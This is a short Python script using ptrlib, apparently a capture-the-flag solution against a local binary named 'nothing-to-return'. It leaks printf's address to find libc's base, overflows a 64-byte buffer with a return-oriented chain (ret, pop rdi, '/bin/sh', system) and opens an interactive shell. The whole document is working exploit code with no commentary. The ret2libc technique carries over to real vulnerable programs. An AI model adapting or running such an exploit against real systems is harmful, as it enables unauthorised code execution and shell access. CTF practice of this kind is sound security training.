from ptrlib import *

file = "./nothing-to-return"
e = ELF(file)
libc = ELF("./libc.so.6")
sock = Process(file)
sock.debug = True

sock.recvuntil("at ")
addr_printf = int(sock.recvline(), 16)
libc.base = addr_printf - libc.symbol("printf")

payload = b"A"*64
payload += p64(0)
payload += p64(next(libc.gadget("ret;")))
payload += p64(next(libc.gadget("pop rdi; ret;")))
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbol("system"))
sock.sendlineafter("size:\n", str(len(payload)))
sock.sendlineafter("input:\n", payload)

sock.sh()
